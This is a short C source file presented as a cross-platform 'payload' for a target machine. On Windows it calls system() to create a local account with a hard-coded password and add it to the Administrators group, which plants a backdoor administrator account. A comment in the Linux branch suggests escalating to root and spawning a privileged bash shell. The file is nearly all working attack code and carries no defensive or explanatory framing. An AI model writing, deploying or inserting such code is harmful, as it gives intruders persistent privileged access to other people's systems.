#include <stdio.h>
#include <stdlib.h>

/*
 * payload.c - Multi-target payload source
 *
 * This file is compiled for both Linux and Windows by the Makefile.
 * Customize the payload logic below.
 */

// -- CONFIGURE --------------------------------------------
#define USERNAME "payload_user"
#define PASSWORD "Payload_P@ss1!"
// ---------------------------------------------------------

int main(void) {
#ifdef _WIN32
    printf("[*] Running on Windows\n");
    system("net user " USERNAME " " PASSWORD " /add");
    system("net localgroup Administrators " USERNAME " /add");
#else
    printf("[*] Running on Linux\n");
    printf("[!] Customize this payload for your target.\n");
    /* Example: setuid(0); system("/bin/bash -p"); */
#endif
    return 0;
}
